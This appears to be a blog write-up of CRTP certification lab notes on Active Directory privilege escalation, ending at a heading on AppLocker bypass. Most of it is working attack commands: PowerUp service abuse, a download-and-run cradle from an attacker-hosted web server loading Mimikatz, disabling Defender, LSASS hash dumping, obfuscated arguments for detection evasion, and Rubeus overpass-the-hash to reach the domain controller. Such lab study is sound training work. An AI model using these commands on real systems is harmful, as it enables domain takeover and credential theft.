---
layout: post
title: Active Directory (AD) | Local Privilege Escalation
date: 2024-06-25 7:40:00 +0800
categories: [Cert, CRTP]
tags: [Cert, Active Directory]     # TAG names should always be lowercase
description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
---


## 1. Local Privilege Escalation

 In Active Directory Environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:
 
 - Hunting for Local Admin access on other machines
 - Hunting for high privilege domain accounts (like a Domain Administrator)
 - Example Scenario : I have local admin access on a machine --> A Domain Admin has a session on that machine --> I steal his token and impersonate him --> Profit!

 There are various ways of locally escalting privilege on Windows:
 
 - Missing Patches
 - Automated Deployment and AutoLogon password in clear text
 - AlwaysInstallElevated (Any user can run MSI on SYSTEM)
 - Misconfigured Services
 - DLL Hijacking and more
 - NTLM Relaying a.k.a Wont’t Fix
 - NTLM Relaying example - https://github.com/antonioCoco/RemotePotato0

 We can use below tools for complete coverage:
 
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - https://github.com/enjoiz/Privesc
 - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md - Very NOISY

## 2. Check for any privilege escalation path - PowerUp

First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.

```bash
#Check for any priviliege escalation path
Invoke-AllChecks
```

![Result](/img/crtp/result1.png){: w="400" h="400" }{: .normal }

```bash
#Abuse the service and add our current domain user to the local Administrator group
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```

Now, our user is a local admin !

## 3. Identify any machine in the domain where our user has local administrative - Find-PSRemotingLocalAdminAccess.ps1

Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 


```bash
#Identify a computer within the network domain where the current user has local admin privileges.
Find-PSRemotingLocalAdminAccess
```

We can connect to the machine who has the local administrative access by using winrs

```bash
winrs -r:dcorp-adminsrv cmd

#Checking the username and computername in the remote winrs session
set username
set computername
```

We can also use PowerShell Remoting

```bash
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## 4. Identify a machine in the domain where a Domain Admin session is available - PowerView

A request will be sent to Domain Controller to retrieve all ComputerName and membership of the domain admin's group which has admin session there.

```bash
Find-DomainUserLocation
```

## 5. Extract Credentials from LSASS - Invoke Mimikatz

Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**

Check if we can run commands on dcorp-mgmt using PowerShell remoting

```bash
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt
```

Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin. This script is to downloads and executes the Invoke-Mimi.ps1 that is hosted in my web server.

```bash
 iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
```

Then, we need to bypass the AMSI using our [script](https://beardenx.github.io/posts/Bypass-AMSI-Like-a-King/). OR

we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt


```bash
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

## 6. Using OverPass-the-Hash - Rubeus

Finally, use OverPass-the-Hash to use svcadmin's credentials.

Run the below commands from an elevated shell on the student VM to use Rubeus.

```bash
ArgSplit.bat

#Run the above commands in the same command prompt session
set "z=t"
set "y=g"
set "x=t"
set "w=k"
set "v=s"
set "u=a"
set "Pwn=%u%%v%%w%%x%%y%%z%"
```


```bash
Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Now, we get our TGT Ticket. Try accessing the domain controller from the new process!
Note that we did not need to have direct access to dcorp-mgmt from student machine 100.X.

```bash
winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
```

## 7. Domain Admin Escalation using Derivative Local Admin - Find-PSRemotingLocalAdminAccess.ps1


```bash
 Find-PSRemotingLocalAdminAccess
```

Bypassing Applocker
